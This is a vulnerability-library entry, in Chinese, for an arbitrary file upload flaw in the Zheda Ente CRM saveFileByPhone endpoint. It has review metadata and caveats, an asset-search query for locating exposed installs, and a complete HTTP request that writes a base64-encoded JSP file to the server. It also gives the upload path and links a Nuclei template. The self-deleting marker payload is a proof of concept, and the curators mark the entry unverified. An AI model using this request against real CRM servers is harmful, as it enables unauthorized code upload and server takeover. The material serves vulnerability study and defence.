---
source: "wy876 漏洞文库"
title: "浙大恩特CRM ProductAction saveFileByPhone Base64写JSP"
product: "浙大恩特CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "goonum固定商品数据/目录，版本未知"
prerequisites: ";.js路径后缀及下载访问条件未知"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ffdm30fuhx2pn2ih"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMsaveFileByPhone%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
hunter: "app.name=\"浙大恩特 CRM\""
id: "vw-8257c26ca586021a172facc3"
entity_id: "ve-8257c26ca586021a172facc3"
schema_version: "1"
previous_fofa_unverified: "app.name="
---

# 浙大恩特CRM ProductAction saveFileByPhone Base64写JSP

> 指纹历史字段校订（2026-10-04）：现有完整平台查询保持原值；旧未核字段中的残片逐字迁入 `previous_*`。此迁移不代表已确定原文其他谓词的组合意图，未给出的 AND/OR 不猜补。后文残片字段的旧诊断描述校订前状态，查询仍不证明资产受影响。

## 条目说明

- 对象与具体问题：浙大恩特CRM；ProductAction saveFileByPhone Base64写JSP
- 版本、配置及部署条件：goonum固定商品数据/目录，版本未知
- 认证与权限前提：;.js路径后缀及下载访问条件未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- imageData解码可读为带引号的JSP打印常数并自删，上传代码在查询串而body test无关
- 后续访问.jsp；.js说明可能还需读取端点绕过，不能仅文件名声称无鉴权执行
- 固定goonum为示例值，缺真实响应/目录权限和修复
- 外部Nuclei附件未审，HTTP误标Java，补副作用

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM saveFileByPhone存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。

## 二、影响版本
+ 浙大恩特CRM

## 三、资产测绘
+ hunter`app.name="浙大恩特 CRM"`
+ 特征


## 四、漏洞复现
```http
POST /entsoft/ProductAction.entphone;.js?method=saveFileByPhone&goonum=954572337&filename=usnw9.jsp&imageData=Ijwlb3V0LnByaW50KDEyNTQxMjU2Mik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPiI= HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Length: 4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1

test
```

> 请求长度说明：原资料 Content-Length 为 4；保留原始标头；其数值未据实际请求体重新计算或验证。


```java
Ijwlb3V0LnByaW50KDEyNTQxMjU2Mik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPiI=
```


上传文件位置

```java
/entsoft/image/goocodimg/goodoc/954572337/usnw9.jsp;.js
```


nuclei脚本

[浙大恩特客户资源管理系统-productaction-entphone--任意文件上传.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222145337-f07f5255-5e64-4561-a65f-567e7b6375d4.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ffdm30fuhx2pn2ih>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
